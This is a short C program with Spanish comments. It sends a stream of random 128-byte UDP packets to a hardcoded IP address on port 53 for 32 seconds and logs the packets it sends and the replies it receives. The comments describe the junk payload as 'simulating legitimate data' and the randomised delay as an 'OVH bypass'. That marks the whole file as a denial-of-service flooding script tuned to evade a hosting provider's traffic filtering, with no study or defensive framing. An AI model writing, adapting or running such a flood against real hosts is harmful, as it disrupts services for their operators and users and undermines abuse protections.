#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define SERVER_IP   "46.105.222.228"  // Cambia esto por la IP de destino
#define SERVER_PORT 53            // Cambia esto por el puerto de destino
#define PACKET_SIZE 128              // Tamaño de los datos UDP enviados
#define RUN_SECONDS 32               // Tiempo de ejecución en segundos

int main() {
    srand(time(NULL)); // Inicializa la semilla para números aleatorios

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    // Opcional: para recibir respuestas, enlaza el socket a un puerto local
    struct sockaddr_in local_addr;
    memset(&local_addr, 0, sizeof(local_addr));
    local_addr.sin_family = AF_INET;
    local_addr.sin_addr.s_addr = INADDR_ANY;
    local_addr.sin_port = htons(0); // Puerto aleatorio del sistema
    if (bind(sock, (struct sockaddr *)&local_addr, sizeof(local_addr)) < 0) {
        perror("bind");
        close(sock);
        return 1;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    char data[PACKET_SIZE];
    char buffer[PACKET_SIZE + 32];
    time_t start = time(NULL);

    while ((time(NULL) - start) < RUN_SECONDS) {
        // Genera datos aleatorios para el paquete UDP (simulando datos legítimos)
        for (int i = 0; i < PACKET_SIZE; i++)
            data[i] = 'A' + (rand() % 26);

        ssize_t sent = sendto(sock, data, PACKET_SIZE, 0,
                              (struct sockaddr*)&server_addr, sizeof(server_addr));
        if (sent < 0) {
            perror("sendto");
            break;
        }

        printf("Enviado paquete UDP con datos: %.*s\n", PACKET_SIZE, data);

        // Espera aleatoria entre 50ms y 100ms (bypass OVH)
        int sleep_time = 50000 + (rand() % 50001);
        usleep(sleep_time);

        // Recibe posibles respuestas (no bloqueante, timeout de 10ms)
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 10000; // 10 ms
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

        struct sockaddr_in from_addr;
        socklen_t from_len = sizeof(from_addr);
        ssize_t received = recvfrom(sock, buffer, sizeof(buffer)-1, 0,
                                   (struct sockaddr*)&from_addr, &from_len);
        if (received > 0) {
            buffer[received] = '\0';
            char from_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(from_addr.sin_addr), from_ip, INET_ADDRSTRLEN);
            printf("Recibido paquete de %s:%d: %s\n",
                   from_ip, ntohs(from_addr.sin_port), buffer);
        }
    }

    close(sock);
    printf("Script finalizado tras %d segundos.\n", RUN_SECONDS);
    return 0;
}
